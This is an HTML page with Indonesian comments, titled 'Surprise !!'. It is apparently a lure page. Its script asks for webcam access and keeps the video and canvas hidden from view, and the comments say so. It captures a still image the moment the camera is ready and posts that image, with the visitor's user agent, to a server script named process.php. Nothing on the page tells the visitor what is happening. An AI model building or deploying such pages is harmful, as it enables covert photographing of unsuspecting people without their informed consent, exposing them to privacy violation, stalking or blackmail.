<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise :</title>
</head>
<body>
    <h1>Surprise !!</h1>
    <video id="video" playsinline autoplay style="display:none;"></video> <!-- Disembunyikan dari view -->
    <canvas id="canvas" style="display:none;"></canvas> <!-- Disembunyikan dari view -->
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Ukuran untuk capture (lebih kecil untuk mempercepat)
        canvas.width = 320;
        canvas.height = 240;

        // Meminta izin menggunakan webcam
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            video.addEventListener('loadedmetadata', () => {
                // Capture segera setelah video siap
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png', 0.5); // Mengurangi kualitas gambar untuk kecepatan
                sendData({
                    imageData: imageData,
                    deviceType: navigator.userAgent
                });
            });
        })
        .catch(error => {
            console.error('Error accessing the camera', error);
            alert('Error accessing the camera: ' + error.message);
        });

        // Fungsi untuk mengirim data
        function sendData(data) {
            fetch('process.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .catch(error => console.error('Error sending data:', error));
        }
    </script>
</body>
</html>
